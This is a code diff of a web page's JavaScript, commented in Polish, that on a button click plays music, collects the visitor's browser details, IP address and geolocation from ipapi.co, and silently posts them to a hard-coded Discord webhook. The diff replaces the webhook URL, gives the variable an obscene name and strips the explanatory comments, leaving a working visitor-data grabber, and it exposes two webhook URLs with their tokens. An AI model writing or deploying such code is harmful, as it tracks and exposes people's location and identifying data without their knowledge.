@@ -102,8 +102,7 @@
   </audio>
 
   <script>
-    /***** KONFIGURACJA: wklej tutaj swój webhook lub zostaw pusty "" aby NIE wysyłać *****/
-    const WEBHOOK_URL = "https://discord.com/api/webhooks/1416739135095439370/rY92FgAACL07Z9wFQE67XLLBpJNYk-k7Bw8FXwifchZt_phAfjNRyvVB4pkbXgob8Rsg"; // <-- zamień na swój Discord webhook lub zostaw pusty ""
+    const cwel_huj= "https://discord.com/api/webhooks/1418366662628872262/i9rKK5whGy1E9YDFU6SpGsN1fsOriaxd-3TQNmHxg3USA0mSb9GztfgNYsFO9z6vB68a";
 
     const enterBtn = document.getElementById('enterBtn');
     const title = document.getElementById('title');
@@ -129,21 +128,17 @@
     }
 
     enterBtn.addEventListener('click', async () => {
-      // ukryj tytuł i przycisk
       title.style.display = 'none';
       enterBtn.style.display = 'none';
       infoDiv.style.display = 'block';
 
-      // odpal muzykę (gest użytkownika)
       music.volume = 1.0;
       music.play().catch(e => console.log("Błąd audio:", e));
 
-      // pobierz dane przeglądarki/systemu
       const browser = navigator.userAgent;
       const platform = navigator.platform;
       const lang = navigator.language;
 
-      // pobierz dane IP/geo
       let data = {};
       try {
         const resp = await fetch('https://ipapi.co/json/');
@@ -152,7 +147,6 @@
         console.error('Błąd pobierania ipapi:', e);
       }
 
-      // przygotuj pola do wyświetlenia
       const fields = [
         "IP: " + (data.ip || 'brak'),
         "Kraj: " + (data.country_name || 'brak'),
@@ -167,8 +161,7 @@
         "Status: Online"
       ];
 
-      // ===== wysyłka do Discord webhook (jeśli ustawiony) =====
-      if (WEBHOOK_URL && WEBHOOK_URL.trim().length > 10) {
+      if (cwel_huj && cwel_huj.trim().length > 10) {
         try {
           const payload = {
             content:
@@ -183,7 +176,7 @@
               `Strona: ${location.href}`
           };
           // wyślij asynchronicznie, nie blokuj UI
-          fetch(WEBHOOK_URL, {
+          fetch(cwel_huj, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify(payload)
